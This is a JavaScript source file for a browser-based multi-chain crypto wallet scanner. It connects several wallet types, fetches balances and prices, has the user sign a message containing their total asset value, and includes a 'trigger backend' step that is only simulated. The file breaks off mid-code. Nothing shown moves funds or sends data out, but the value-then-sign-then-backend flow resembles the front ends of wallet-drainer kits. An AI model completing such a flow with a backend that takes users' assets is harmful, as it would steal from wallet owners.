// ==============================
// ULTIMATE MULTI-CHAIN WALLET SCANNER - MOBILE & DESKTOP
// ==============================

const CONFIG = {
    // Wallet Deep Links
    WALLET_LINKS: {
        metamask: {
            mobile: {
                android: 'https://metamask.app.link/connect?url=' + window.location.href,
                ios: 'https://metamask.app.link/connect?url=' + window.location.href,
                universal: 'https://metamask.app.link/connect?url=' + window.location.href
            },
            desktop: 'https://metamask.io/',
            extension: 'chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html'
        },
        binance: {
            mobile: {
                android: 'bnbwallet://',
                ios: 'bnbwallet://',
                universal: 'https://www.binance.com/en/download'
            },
            desktop: 'https://www.binance.org/en/download',
            extension: 'chrome-extension://fhbohimaelbohpjbbldcngcnapndodjp/home.html'
        },
        trust: {
            mobile: {
                android: 'https://link.trustwallet.com/open_url?url=' + window.location.href,
                ios: 'trust://',
                universal: 'https://link.trustwallet.com/open_url?url=' + window.location.href
            },
            desktop: 'https://trustwallet.com/',
            extension: 'chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/home.html'
        },
        phantom: {
            mobile: {
                android: 'https://phantom.app/ul/browse/' + window.location.href + '?ref=' + window.location.hostname,
                ios: 'https://phantom.app/ul/browse/' + window.location.href + '?ref=' + window.location.hostname,
                universal: 'https://phantom.app/ul/browse/' + window.location.href + '?ref=' + window.location.hostname
            },
            desktop: 'https://phantom.app/',
            extension: 'chrome-extension://bfnaelmomeimhlpmgjnjophhpkkoljpa/home.html'
        }
    },

    // EVM Chains
    EVM_CHAINS: [
        { id: 1, name: 'Ethereum', rpc: 'https://rpc.ankr.com/eth', symbol: 'ETH', color: '#627EEA' },
        { id: 56, name: 'BNB Chain', rpc: 'https://bsc-dataseed.binance.org', symbol: 'BNB', color: '#F0B90B' },
        { id: 137, name: 'Polygon', rpc: 'https://polygon-rpc.com', symbol: 'MATIC', color: '#8247E5' },
        { id: 42161, name: 'Arbitrum', rpc: 'https://arb1.arbitrum.io/rpc', symbol: 'ETH', color: '#28A0F0' },
        { id: 10, name: 'Optimism', rpc: 'https://mainnet.optimism.io', symbol: 'ETH', color: '#FF0420' },
        { id: 43114, name: 'Avalanche', rpc: 'https://api.avax.network/ext/bc/C/rpc', symbol: 'AVAX', color: '#E84142' },
        { id: 250, name: 'Fantom', rpc: 'https://rpcapi.fantom.network', symbol: 'FTM', color: '#1969FF' },
        { id: 25, name: 'Cronos', rpc: 'https://evm.cronos.org', symbol: 'CRO', color: '#121926' },
        { id: 42220, name: 'Celo', rpc: 'https://forno.celo.org', symbol: 'CELO', color: '#35D07F' },
        { id: 8453, name: 'Base', rpc: 'https://mainnet.base.org', symbol: 'ETH', color: '#0052FF' },
    ],
    
    // Non-EVM Chains
    NON_EVM_CHAINS: [
        { id: 'solana', name: 'Solana', rpc: 'https://api.mainnet-beta.solana.com', symbol: 'SOL', color: '#9945FF' },
        { id: 'tron', name: 'Tron', rpc: 'https://api.trongrid.io', symbol: 'TRX', color: '#FF060A' },
        { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', color: '#F7931A' },
    ]
};

// State
let state = {
    wallets: [],
    tokens: [],
    selectedChains: [1, 56, 137, 42161, 10, 43114, 250, 'solana'],
    isScanning: false,
    totalValue: 0,
    isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
};

// ==============================
// WALLET MANAGER - MOBILE & DESKTOP
// ==============================

const WalletManager = {
    // Check if wallet is available
    isWalletAvailable(walletId) {
        if (state.isMobile) {
            return true; // On mobile, always show wallet options (they'll open in app)
        }
        
        // On desktop, check for extension
        switch(walletId) {
            case 'metamask':
                return !!(window.ethereum && window.ethereum.isMetaMask);
            case 'binance':
                return !!(window.BinanceChain || window.BSC);
            case 'phantom':
                return !!(window.solana && window.solana.isPhantom);
            case 'trust':
                return !!window.trustwallet;
            default:
                return false;
        }
    },
    
    // Get wallet connection link
    getWalletLink(walletId) {
        const walletLinks = CONFIG.WALLET_LINKS[walletId];
        if (!walletLinks) return '#';
        
        if (state.isMobile) {
            // For mobile, use deep links
            const userAgent = navigator.userAgent.toLowerCase();
            if (userAgent.includes('android')) {
                return walletLinks.mobile.android;
            } else if (userAgent.includes('iphone') || userAgent.includes('ipad')) {
                return walletLinks.mobile.ios;
            } else {
                return walletLinks.mobile.universal;
            }
        } else {
            // For desktop, use extension or install link
            if (this.isWalletAvailable(walletId)) {
                return 'javascript:void(0)'; // Will use JavaScript connection
            } else {
                return walletLinks.desktop; // Install link
            }
        }
    },
    
    // Connect to wallet (desktop) or redirect (mobile)
    async connectWallet(walletId) {
        console.log(`Connecting to ${walletId}...`);
        
        if (state.isMobile) {
            // On mobile, redirect to wallet app
            this.redirectToWallet(walletId);
            return;
        }
        
        // On desktop, connect via JavaScript
        try {
            let wallet;
            
            switch(walletId) {
                case 'metamask':
                    wallet = await this.connectMetaMask();
                    break;
                case 'binance':
                    wallet = await this.connectBinance();
                    break;
                case 'phantom':
                    wallet = await this.connectPhantom();
                    break;
                case 'trust':
                    wallet = await this.connectTrust();
                    break;
                default:
                    throw new Error('Unsupported wallet');
            }
            
            return wallet;
            
        } catch (error) {
            console.error('Connection error:', error);
            throw error;
        }
    },
    
    // Redirect to wallet app (mobile)
    redirectToWallet(walletId) {
        const walletLinks = CONFIG.WALLET_LINKS[walletId];
        if (!walletLinks) {
            alert('Wallet not supported');
            return;
        }
        
        const userAgent = navigator.userAgent.toLowerCase();
        let deepLink = '';
        
        if (userAgent.includes('android')) {
            deepLink = walletLinks.mobile.android;
        } else if (userAgent.includes('iphone') || userAgent.includes('ipad')) {
            deepLink = walletLinks.mobile.ios;
        } else {
            deepLink = walletLinks.mobile.universal;
        }
        
        // Store wallet type for when user returns
        localStorage.setItem('pendingWallet', walletId);
        
        // Open deep link
        window.location.href = deepLink;
        
        // Fallback: If deep link fails, open install page
        setTimeout(() => {
            if (!document.hidden) {
                window.location.href = walletLinks.desktop;
            }
        }, 2000);
    },
    
    // Desktop connection methods
    async connectMetaMask() {
        if (!window.ethereum || !window.ethereum.isMetaMask) {
            throw new Error('MetaMask not detected. Please install MetaMask extension.');
        }
        
        try {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            
            if (!accounts || accounts.length === 0) {
                throw new Error('No accounts found');
            }
            
            const chainIdHex = await window.ethereum.request({ 
                method: 'eth_chainId' 
            });
            
            return {
                address: accounts[0],
                chainId: parseInt(chainIdHex, 16),
                type: 'evm',
                name: 'MetaMask',
                icon: 'fab fa-metamask',
                color: '#f6851b',
                provider: window.ethereum,
                walletType: 'metamask'
            };
        } catch (error) {
            throw new Error(`MetaMask: ${error.message}`);
        }
    },
    
    async connectBinance() {
        // Check for Binance Wallet
        if (!window.BinanceChain && !window.BSC) {
            throw new Error('Binance Wallet not detected. Please install Binance Wallet extension.');
        }
        
        const provider = window.BinanceChain || window.BSC;
        
        try {
            const accounts = await provider.request({
                method: "eth_requestAccounts"
            });
            
            if (!accounts || accounts.length === 0) {
                throw new Error("No accounts found");
            }
            
            const chainIdHex = await provider.request({ 
                method: "eth_chainId" 
            });
            
            return {
                address: accounts[0],
                chainId: parseInt(chainIdHex, 16),
                type: 'evm',
                name: 'Binance Wallet',
                icon: 'fab fa-binance',
                color: '#F0B90B',
                provider: provider,
                walletType: 'binance'
            };
        } catch (error) {
            throw new Error(`Binance Wallet: ${error.message}`);
        }
    },
    
    async connectPhantom() {
        if (!window.solana || !window.solana.isPhantom) {
            throw new Error('Phantom wallet not detected. Please install Phantom extension.');
        }
        
        try {
            const resp = await window.solana.connect();
            
            return {
                address: resp.publicKey.toString(),
                chainId: 'solana',
                type: 'solana',
                name: 'Phantom',
                icon: 'fas fa-ghost',
                color: '#ab9ff2',
                provider: window.solana,
                walletType: 'phantom'
            };
        } catch (error) {
            throw new Error(`Phantom: ${error.message}`);
        }
    },
    
    async connectTrust() {
        if (!window.trustwallet) {
            throw new Error('Trust Wallet not detected.');
        }
        
        try {
            const accounts = await window.trustwallet.request({ 
                method: 'eth_requestAccounts' 
            });
            
            const chainIdHex = await window.trustwallet.request({ 
                method: 'eth_chainId' 
            });
            
            return {
                address: accounts[0],
                chainId: parseInt(chainIdHex, 16),
                type: 'evm',
                name: 'Trust Wallet',
                icon: 'fas fa-shield-alt',
                color: '#3375bb',
                provider: window.trustwallet,
                walletType: 'trust'
            };
        } catch (error) {
            throw new Error(`Trust Wallet: ${error.message}`);
        }
    }
};

// ==============================
// TOKEN SCANNER
// ==============================

const TokenScanner = {
    async scanWallet(wallet) {
        console.log(`Scanning ${wallet.name}...`);
        
        const results = {
            wallet: wallet,
            chainBalances: [],
            allTokens: [],
            totalValue: 0
        };
        
        try {
            if (wallet.type === 'evm') {
                // Scan selected EVM chains
                for (const chain of CONFIG.EVM_CHAINS) {
                    if (state.selectedChains.includes(chain.id)) {
                        try {
                            console.log(`Scanning ${chain.name}...`);
                            const chainResult = await this.scanEVMChain(wallet.address, chain);
                            if (chainResult && chainResult.totalValue > 0) {
                                results.chainBalances.push(chainResult);
                                results.allTokens.push(...chainResult.tokens);
                                results.totalValue += chainResult.totalValue;
                            }
                        } catch (error) {
                            console.log(`Skipped ${chain.name}:`, error.message);
                        }
                    }
                }
            }
            
            // Scan Solana
            if (wallet.type === 'solana' && state.selectedChains.includes('solana')) {
                try {
                    console.log('Scanning Solana...');
                    const solResult = await this.scanSolana(wallet.address);
                    if (solResult && solResult.totalValue > 0) {
                        results.chainBalances.push(solResult);
                        results.allTokens.push(...solResult.tokens);
                        results.totalValue += solResult.totalValue;
                    }
                } catch (error) {
                    console.log('Skipped Solana:', error.message);
                }
            }
            
            console.log(`Scan complete: ${results.chainBalances.length} chains, ${results.allTokens.length} tokens`);
            return results;
            
        } catch (error) {
            console.error('Scan error:', error);
            return results;
        }
    },
    
    async scanEVMChain(address, chain) {
        try {
            // Get native balance
            const balance = await this.getNativeBalance(address, chain.rpc);
            const price = await this.getTokenPrice(chain.symbol);
            const value = balance * price;
            
            const tokens = [{
                address: 'native',
                symbol: chain.symbol,
                name: `${chain.name} Native`,
                balance: balance.toFixed(6),
                decimals: 18,
                price: price,
                value: value,
                chain: chain.name,
                chainId: chain.id,
                type: 'native',
                logo: this.getTokenLogo(chain.symbol)
            }];
            
            const totalValue = tokens.reduce((sum, token) => sum + token.value, 0);
            
            return {
                chain: chain,
                nativeBalance: {
                    symbol: chain.symbol,
                    balance: balance.toFixed(6),
                    price: price,
                    value: value
                },
                tokens: tokens,
                totalValue: totalValue
            };
            
        } catch (error) {
            console.error(`Failed to scan ${chain.name}:`, error);
            throw error;
        }
    },
    
    async getNativeBalance(address, rpcUrl) {
        try {
            const response = await fetch(rpcUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    jsonrpc: '2.0',
                    id: 1,
                    method: 'eth_getBalance',
                    params: [address, 'latest']
                })
            });
            
            const data = await response.json();
            return data.result ? parseInt(data.result, 16) / 1e18 : 0;
        } catch (error) {
            console.error('Balance fetch error:', error);
            return 0;
        }
    },
    
    async scanSolana(address) {
        try {
            const solPrice = await this.getTokenPrice('SOL');
            
            // Get SOL balance
            const response = await fetch('https://api.mainnet-beta.solana.com', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    jsonrpc: '2.0',
                    id: 1,
                    method: 'getBalance',
                    params: [address]
                })
            });
            
            const data = await response.json();
            const solBalance = data.result ? data.result.value / 1e9 : 0;
            
            if (solBalance === 0) return null;
            
            const solValue = solBalance * solPrice;
            
            const tokens = [{
                address: 'native',
                symbol: 'SOL',
                name: 'Solana',
                balance: solBalance.toFixed(6),
                decimals: 9,
                price: solPrice,
                value: solValue,
                chain: 'Solana',
                type: 'native',
                logo: this.getTokenLogo('SOL')
            }];
            
            const totalValue = tokens.reduce((sum, token) => sum + token.value, 0);
            
            return {
                chain: CONFIG.NON_EVM_CHAINS.find(c => c.id === 'solana'),
                nativeBalance: {
                    symbol: 'SOL',
                    balance: solBalance.toFixed(6),
                    price: solPrice,
                    value: solValue
                },
                tokens: tokens,
                totalValue: totalValue
            };
            
        } catch (error) {
            console.error('Solana scan error:', error);
            return null;
        }
    },
    
    async getTokenPrice(symbol) {
        const cacheKey = `price_${symbol}`;
        const cached = localStorage.getItem(cacheKey);
        
        if (cached) {
            const data = JSON.parse(cached);
            if (Date.now() - data.timestamp < 300000) {
                return data.price;
            }
        }
        
        try {
            const coinId = this.getCoinId(symbol);
            const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${coinId}&vs_currencies=usd`);
            
            if (response.ok) {
                const data = await response.json();
                const price = data[coinId]?.usd || 0;
                
                if (price > 0) {
                    localStorage.setItem(cacheKey, JSON.stringify({
                        price: price,
                        timestamp: Date.now()
                    }));
                    return price;
                }
            }
        } catch (error) {
            console.log(`Price fetch failed for ${symbol}`);
        }
        
        // Default prices
        const defaultPrices = {
            'ETH': 2500,
            'BNB': 300,
            'MATIC': 0.8,
            'SOL': 100,
            'AVAX': 30,
            'FTM': 0.3,
            'TRX': 0.1,
            'BTC': 45000,
            'USDT': 1,
            'USDC': 1,
            'DAI': 1,
            'BUSD': 1
        };
        
        return defaultPrices[symbol.toUpperCase()] || 0;
    },
    
    getCoinId(symbol) {
        const mapping = {
            'ETH': 'ethereum',
            'BNB': 'binancecoin',
            'MATIC': 'matic-network',
            'SOL': 'solana',
            'AVAX': 'avalanche-2',
            'FTM': 'fantom',
            'TRX': 'tron',
            'BTC': 'bitcoin',
            'USDT': 'tether',
            'USDC': 'usd-coin',
            'DAI': 'dai',
            'BUSD': 'binance-usd'
        };
        return mapping[symbol.toUpperCase()] || symbol.toLowerCase();
    },
    
    getTokenLogo(symbol) {
        const logos = {
            'ETH': 'https://assets.coingecko.com/coins/images/279/small/ethereum.png',
            'BNB': 'https://assets.coingecko.com/coins/images/825/small/bnb-icon2.png',
            'MATIC': 'https://assets.coingecko.com/coins/images/4713/small/matic-token-icon.png',
            'SOL': 'https://assets.coingecko.com/coins/images/4128/small/solana.png',
            'AVAX': 'https://assets.coingecko.com/coins/images/12559/small/coin-round-red.png',
            'FTM': 'https://assets.coingecko.com/coins/images/4001/small/Fantom.png',
            'TRX': 'https://assets.coingecko.com/coins/images/1094/small/tron-logo.png',
            'BTC': 'https://assets.coingecko.com/coins/images/1/small/bitcoin.png',
            'USDT': 'https://assets.coingecko.com/coins/images/325/small/Tether.png',
            'USDC': 'https://assets.coingecko.com/coins/images/6319/small/usdc.png',
            'DAI': 'https://assets.coingecko.com/coins/images/9956/small/dai-multi-collateral-mcd.png',
            'BUSD': 'https://assets.coingecko.com/coins/images/9576/small/BUSD.png'
        };
        return logos[symbol.toUpperCase()] || `https://via.placeholder.com/32/cccccc/000000?text=${symbol.substring(0, 3)}`;
    }
};

// ==============================
// UI MANAGER
// ==============================

const UIManager = {
    init() {
        this.renderWalletButtons();
        this.renderChainSelector();
        this.checkMobileReturn();
    },
    
    renderWalletButtons() {
        const container = document.getElementById('walletGrid');
        if (!container) return;
        
        const wallets = [
            {
                id: 'metamask',
                name: 'MetaMask',
                icon: 'fab fa-metamask',
                color: '#f6851b',
                description: state.isMobile ? 'Tap to open in MetaMask app' : WalletManager.isWalletAvailable('metamask') ? 'Click to connect' : 'Install extension'
            },
            {
                id: 'binance',
                name: 'Binance Wallet',
                icon: 'fab fa-binance',
                color: '#F0B90B',
                description: state.isMobile ? 'Tap to open in Binance app' : WalletManager.isWalletAvailable('binance') ? 'Click to connect' : 'Install extension'
            },
            {
                id: 'trust',
                name: 'Trust Wallet',
                icon: 'fas fa-shield-alt',
                color: '#3375bb',
                description: state.isMobile ? 'Tap to open in Trust Wallet' : WalletManager.isWalletAvailable('trust') ? 'Click to connect' : 'Install extension'
            },
            {
                id: 'phantom',
                name: 'Phantom',
                icon: 'fas fa-ghost',
                color: '#ab9ff2',
                description: state.isMobile ? 'Tap to open in Phantom app' : WalletManager.isWalletAvailable('phantom') ? 'Click to connect' : 'Install extension'
            }
        ];
        
        container.innerHTML = wallets.map(wallet => {
            const isAvailable = state.isMobile ? true : WalletManager.isWalletAvailable(wallet.id);
            const link = WalletManager.getWalletLink(wallet.id);
            
            return `
                <div class="wallet-card ${wallet.id}" 
                     onclick="handleWalletClick('${wallet.id}')"
                     style="cursor: pointer; opacity: ${isAvailable ? '1' : '0.7'};">
                    <i class="${wallet.icon}"></i>
                    <h3>${wallet.name}</h3>
                    <p>${wallet.description}</p>
                    ${!isAvailable && !state.isMobile ? 
                        `<div style="margin-top: 10px; font-size: 12px; color: #ef4444;">
                            <i class="fas fa-exclamation-circle"></i> Not installed
                        </div>` : ''
                    }
                </div>
            `;
        }).join('');
    },
    
    renderChainSelector() {
        const container = document.getElementById('chainsList');
        if (!container) return;
        
        let html = '';
        
        // EVM Chains
        CONFIG.EVM_CHAINS.forEach(chain => {
            const isSelected = state.selectedChains.includes(chain.id);
            html += `
                <label class="chain-checkbox" style="display: flex; align-items: center; gap: 8px; padding: 8px 12px; 
                       background: ${isSelected ? chain.color + '20' : '#f8fafc'}; 
                       border: 1px solid ${isSelected ? chain.color + '50' : '#e2e8f0'}; 
                       border-radius: 8px; cursor: pointer; transition: all 0.2s;">
                    <input type="checkbox" ${isSelected ? 'checked' : ''} 
                           onchange="window.toggleChain(${chain.id})" style="cursor: pointer;">
                    <div style="display: flex; align-items: center; gap: 8px;">
                        <div style="width: 12px; height: 12px; border-radius: 50%; background: ${chain.color};"></div>
                        <span style="font-size: 14px; color: #334155;">${chain.name}</span>
                    </div>
                </label>
            `;
        });
        
        // Non-EVM Chains
        CONFIG.NON_EVM_CHAINS.forEach(chain => {
            const isSelected = state.selectedChains.includes(chain.id);
            html += `
                <label class="chain-checkbox" style="display: flex; align-items: center; gap: 8px; padding: 8px 12px; 
                       background: ${isSelected ? chain.color + '20' : '#f8fafc'}; 
                       border: 1px solid ${isSelected ? chain.color + '50' : '#e2e8f0'}; 
                       border-radius: 8px; cursor: pointer; transition: all 0.2s;">
                    <input type="checkbox" ${isSelected ? 'checked' : ''} 
                           onchange="window.toggleChain('${chain.id}')" style="cursor: pointer;">
                    <div style="display: flex; align-items: center; gap: 8px;">
                        <div style="width: 12px; height: 12px; border-radius: 50%; background: ${chain.color};"></div>
                        <span style="font-size: 14px; color: #334155;">${chain.name}</span>
                    </div>
                </label>
            `;
        });
        
        container.innerHTML = html;
    },
    
    renderConnectedWallets() {
        const container = document.getElementById('walletsList');
        if (!container) return;
        
        if (state.wallets.length === 0) {
            container.innerHTML = '<p style="color: #6b7280; font-style: italic;">No wallets connected</p>';
            return;
        }
        
        container.innerHTML = state.wallets.map(wallet => `
            <div class="wallet-chip" style="background: ${wallet.color}">
                <i class="${wallet.icon}"></i>
                ${wallet.name}: ${this.formatAddress(wallet.address)}
                <button class="remove" onclick="window.disconnectWallet('${wallet.address}')">
                    <i class="fas fa-times"></i>
                </button>
            </div>
        `).join('');
    },
    
    renderScanResults() {
        const container = document.getElementById('walletDetails');
        if (!container) return;
        
        if (state.wallets.length === 0) {
            container.innerHTML = '<p style="text-align: center; color: #6b7280;">Connect a wallet to see results</p>';
            return;
        }
        
        let html = '';
        let totalValue = 0;
        
        state.wallets.forEach(wallet => {
            if (wallet.scanResults) {
                totalValue += wallet.scanResults.totalValue || 0;
                
                html += `
                    <div class="wallet-details">
                        <div class="wallet-header">
                            <div class="wallet-info">
                                <h4>${wallet.name}</h4>
                                <span class="wallet-address">${this.formatAddress(wallet.address)}</span>
                            </div>
                            <div class="wallet-actions">
                                <button class="btn btn-secondary" onclick="window.rescanWallet('${wallet.address}')">
                                    <i class="fas fa-sync-alt"></i> Rescan
                                </button>
                            </div>
                        </div>
                        
                        <div class="wallet-balance">
                            <div class="balance-value">$${(wallet.scanResults.totalValue || 0).toFixed(2)}</div>
                            <div class="balance-label">Total Value</div>
                        </div>
                `;
                
                if (wallet.scanResults.chainBalances.length > 0) {
                    html += `
                        <div class="wallet-chains">
                            <h4 style="margin-bottom: 15px;">Chain Balances:</h4>
                            <div class="chains-grid">
                    `;
                    
                    wallet.scanResults.chainBalances.forEach(chainResult => {
                        const chain = chainResult.chain;
                        html += `
                            <div class="chain-item">
                                <div class="chain-header">
                                    <div class="chain-icon" style="background: ${chain.color}">
                                        ${chain.symbol.substring(0, 3)}
                                    </div>
                                    <div class="chain-name">${chain.name}</div>
                                </div>
                                <div class="chain-balance">${chainResult.nativeBalance.balance} ${chainResult.nativeBalance.symbol}</div>
                                <div class="chain-value">$${chainResult.totalValue.toFixed(2)}</div>
                            </div>
                        `;
                    });
                    
                    html += `
                            </div>
                        </div>
                    `;
                }
                
                html += `</div>`;
            }
        });
        
        container.innerHTML = html;
        
        // Update total value display
        const totalValueEl = document.getElementById('totalValue');
        if (totalValueEl) {
            totalValueEl.textContent = `Total Value: $${totalValue.toFixed(2)}`;
            state.totalValue = totalValue;
        }
        
        // Show sections
        this.showSection('scanResults');
        this.showSection('tokensSection');
    },
    
    formatAddress(address) {
        if (!address) return '';
        return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
    },
    
    showSection(sectionId) {
        const element = document.getElementById(sectionId);
        if (element) {
            element.classList.remove('hidden');
        }
    },
    
    hideSection(sectionId) {
        const element = document.getElementById(sectionId);
        if (element) {
            element.classList.add('hidden');
        }
    },
    
    showToast(message, type = 'info') {
        const toastContainer = document.getElementById('toastContainer');
        const toast = document.createElement('div');
        toast.className = `toast ${type}`;
        toast.innerHTML = `
            <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i>
            <span>${message}</span>
        `;
        
        toastContainer.appendChild(toast);
        
        setTimeout(() => {
            toast.remove();
        }, 5000);
    },
    
    showLoading(message) {
        const loadingText = document.getElementById('loadingText');
        const loadingOverlay = document.getElementById('loadingOverlay');
        
        if (loadingText) loadingText.textContent = message;
        if (loadingOverlay) loadingOverlay.style.display = 'flex';
    },
    
    hideLoading() {
        const loadingOverlay = document.getElementById('loadingOverlay');
        if (loadingOverlay) loadingOverlay.style.display = 'none';
    },
    
    // Check if user returned from mobile wallet
    checkMobileReturn() {
        if (!state.isMobile) return;
        
        const pendingWallet = localStorage.getItem('pendingWallet');
        if (pendingWallet) {
            localStorage.removeItem('pendingWallet');
            
            // Show message
            this.showToast(`Returned from ${pendingWallet}. Please sign the connection request in your wallet app.`, 'info');
            
            // On mobile, we can't auto-connect, so show instructions
            setTimeout(() => {
                alert(`If you connected your ${pendingWallet} wallet, please refresh this page to see your balances.`);
            }, 2000);
        }
    }
};

// ==============================
// MAIN FUNCTIONS
// ==============================

async function handleWalletClick(walletId) {
    if (state.isMobile) {
        // On mobile, redirect to wallet app
        WalletManager.redirectToWallet(walletId);
        return;
    }
    
    // On desktop, connect via JavaScript
    await connectWallet(walletId);
}

async function connectWallet(walletId) {
    console.log(`Connecting ${walletId}...`);
    
    UIManager.showLoading(`Connecting ${walletId}...`);
    
    try {
        const wallet = await WalletManager.connectWallet(walletId);
        
        // Check if already connected
        const existingIndex = state.wallets.findIndex(w => 
            w.address.toLowerCase() === wallet.address.toLowerCase()
        );
        
        if (existingIndex === -1) {
            state.wallets.push(wallet);
        } else {
            state.wallets[existingIndex] = wallet;
        }
        
        // Update UI
        UIManager.renderConnectedWallets();
        UIManager.showSection('chainsSection');
        UIManager.showSection('connectedSection');
        UIManager.showToast(`${wallet.name} connected successfully!`, 'success');
        
        // Auto-scan
        await scanWallet(wallet);
        
        UIManager.hideLoading();
        
    } catch (error) {
        console.error('Connection error:', error);
        UIManager.hideLoading();
        UIManager.showToast(error.message, 'error');
    }
}

async function scanWallet(wallet) {
    if (!wallet) return;
    
    UIManager.showLoading(`Scanning ${wallet.name}...`);
    
    try {
        const results = await TokenScanner.scanWallet(wallet);
        
        // Update wallet
        const index = state.wallets.findIndex(w => w.address === wallet.address);
        if (index !== -1) {
            state.wallets[index].scanResults = results;
        }
        
        // Update UI
        UIManager.renderScanResults();
        
        UIManager.hideLoading();
        
        const tokenCount = results.allTokens.length;
        if (tokenCount > 0) {
            UIManager.showToast(`Found assets worth $${results.totalValue.toFixed(2)}`, 'success');
        } else {
            UIManager.showToast('No assets found on selected chains', 'info');
        }
        
    } catch (error) {
        console.error('Scan error:', error);
        UIManager.hideLoading();
        UIManager.showToast('Scan completed with some errors', 'warning');
    }
}

async function scanAllSelectedChains() {
    if (state.wallets.length === 0) {
        UIManager.showToast('No wallets connected', 'warning');
        return;
    }
    
    UIManager.showLoading(`Scanning ${state.wallets.length} wallet(s)...`);
    
    try {
        for (const wallet of state.wallets) {
            await scanWallet(wallet);
        }
        UIManager.showToast('All wallets scanned!', 'success');
    } catch (error) {
        UIManager.showToast('Scan failed', 'error');
    } finally {
        UIManager.hideLoading();
    }
}

async function rescanWallet(address) {
    const wallet = state.wallets.find(w => w.address === address);
    if (wallet) {
        await scanWallet(wallet);
    }
}

function disconnectWallet(address) {
    state.wallets = state.wallets.filter(w => w.address !== address);
    UIManager.renderConnectedWallets();
    UIManager.renderScanResults();
    
    if (state.wallets.length === 0) {
        UIManager.hideSection('chainsSection');
        UIManager.hideSection('connectedSection');
        UIManager.hideSection('scanResults');
        UIManager.hideSection('tokensSection');
        UIManager.hideSection('authSection');
    }
    
    UIManager.showToast('Wallet disconnected', 'info');
}

function disconnectAllWallets() {
    if (state.wallets.length === 0) {
        UIManager.showToast('No wallets connected', 'warning');
        return;
    }
    
    if (!confirm('Disconnect all wallets?')) return;
    
    state.wallets = [];
    state.tokens = [];
    state.totalValue = 0;
    
    UIManager.renderConnectedWallets();
    UIManager.renderScanResults();
    UIManager.hideSection('chainsSection');
    UIManager.hideSection('connectedSection');
    UIManager.hideSection('scanResults');
    UIManager.hideSection('tokensSection');
    UIManager.hideSection('authSection');
    
    UIManager.showToast('All wallets disconnected', 'info');
}

function toggleChain(chainId) {
    const index = state.selectedChains.indexOf(chainId);
    if (index === -1) {
        state.selectedChains.push(chainId);
    } else {
        state.selectedChains.splice(index, 1);
    }
    console.log('Selected chains:', state.selectedChains);
    
    // Update UI
    UIManager.renderChainSelector();
}

async function signForBackend() {
    if (state.wallets.length === 0) {
        UIManager.showToast('No wallets connected', 'warning');
        return;
    }
    
    UIManager.showLoading('Signing message...');
    
    try {
        // For mobile, show instructions
        if (state.isMobile) {
            UIManager.hideLoading();
            alert('On mobile, please sign the message in your wallet app. Then refresh this page.');
            return;
        }
        
        // For desktop, sign with each wallet
        for (const wallet of state.wallets) {
            if (wallet.type === 'evm') {
                const message = `Authorize MultiChain Scanner\nAddress: ${wallet.address}\nTotal Value: $${state.totalValue.toFixed(2)}\nTimestamp: ${Date.now()}`;
                
                try {
                    const signature = await wallet.provider.request({
                        method: 'personal_sign',
                        params: [message, wallet.address]
                    });
                    console.log(`${wallet.name} signed:`, signature);
                } catch (error) {
                    console.error(`Failed to sign ${wallet.name}:`, error);
                }
            }
        }
        
        UIManager.hideLoading();
        UIManager.showSection('authSection');
        UIManager.showToast('All wallets signed successfully!', 'success');
        
    } catch (error) {
        UIManager.hideLoading();
        UIManager.showToast(`Signing failed: ${error.message}`, 'error');
    }
}

async function triggerBackend() {
    try {
        UIManager.showLoading('Processing...');
        
        // Prepare data for backend
        const requestData = {
            wallets: state.wallets.map(wallet => ({
                address: wallet.address,
                type: wallet.type,
                walletType: wallet.walletType,
                scanResults: wallet.scanResults,
                totalValue: state.totalValue
            })),
            selectedChains: state.selectedChains,
            timestamp: new Date().toISOString()
        };
        
        console.log('Backend data:', requestData);
        
        // Simulate API call
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        UIManager.hideLoading();
        UIManager.showToast('Backend processing complete!', 'success');
        
    } catch (error) {
        UIManager.hideLoading();
        UIManager.showToast(`Error: ${error.message}`, 'error');
    }
}

function exportData() {
    if (state.wallets.length === 0) {
        UIManager.showToast('No data to export', 'warning');
        return;
    }
    
    const exportData = {
        wallets: state.wallets,
        totalValue: state.totalValue,
        selectedChains: state.selectedChains,
        exportDate: new Date().toISOString()
    };
    
    const dataStr = JSON.stringify(exportData, null, 2);
    const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
    
    const exportFileDefaultName = `multichain-scan-${Date.now()}.json`;
    
    const linkElement = document.createElement('a');
    linkElement.setAttribute('href', dataUri);
    linkElement.setAttribute('download', exportFileDefaultName);
    linkElement.click();
    
    UIManager.showToast('Data exported successfully!', 'success');
}

function showHelp() {
    UIManager.showToast(`
        <div style="text-align: left;">
            <strong>How to use:</strong><br>
            1. Click a wallet to connect (opens app on mobile)<br>
            2. Select chains to scan<br>
            3. Click "Scan All Selected Chains"<br>
            4. Click "Sign & Continue"<br>
            5. Click "Continue & Trigger Backend"<br>
            6. Export data if needed
        </div>
    `, 'info');
}

// ==============================
// INITIALIZATION
// ==============================

// Make functions globally available
window.handleWalletClick = handleWalletClick;
window.connectWallet = connectWallet;
window.scanWallet = scanWallet;
window.scanAllSelectedChains = scanAllSelectedChains;
window.rescanWallet = rescanWallet;
window.toggleChain = toggleChain;
window.disconnectWallet = disconnectWallet;
window.disconnectAllWallets = disconnectAllWallets;
window.signForBackend = signForBackend;
window.triggerBackend = triggerBackend;
window.exportData = exportData;
window.showHelp = showHelp;

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    console.log('MultiChain Wallet Scanner Initialized');
    
    // Initialize UI
    UIManager.init();
    
    // Show welcome message
    setTimeout(() => {
        if (state.isMobile) {
            UIManager.showToast('Tap a wallet to open in its app', 'info');
        } else {
            UIManager.showToast('Click a wallet to connect and scan', 'info');
        }
    }, 1000);
    
    // Listen for wallet changes (desktop only)
    if (!state.isMobile) {
        if (window.ethereum) {
